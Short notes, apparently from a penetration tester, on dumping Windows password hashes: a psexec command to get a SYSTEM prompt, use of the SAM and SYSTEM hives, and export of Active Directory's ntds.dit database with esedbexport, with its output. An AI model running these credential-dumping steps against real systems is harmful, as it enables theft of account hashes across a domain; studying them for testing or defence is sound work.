- Windows uses MD4 algorithm to store NTLM passwords.

- c:\>psexec.exe -s -i -d cmd.exe : open the command prompt as local system.

- if we have SAM database and SYSTEM hives then we do not need to run the cmd.exe as local system. Administrator user can see NTLM hashes with hash dump utility.

- In active directory we have to use ntds.dit and system file. 

- Extract ntds.dit file data:
  <pre>
  c:\>esedbexport.exe <ntds.dit file>
  
      esedbexport 20120102
    Opening file.

    Exporting table 1 (MSysObjects) out of 11.
    Exporting table 2 (MSysObjectsShadow) out of 11.
    Exporting table 3 (MSysUnicodeFixupVer1) out of 11.
    Exporting table 4 (datatable) out of 11.
    Exporting table 5 (link_table) out of 11.
    Exporting table 6 (hiddentable) out of 11.
    Exporting table 7 (sdproptable) out of 11.
    Exporting table 8 (sd_table) out of 11.
    Exporting table 9 (quota_table) out of 11.
    Exporting table 10 (quota_rebuild_progress_table) out of 11.
    Exporting table 11 (MSysDefrag1) out of 11.
    Export completed.
  </pre>
  
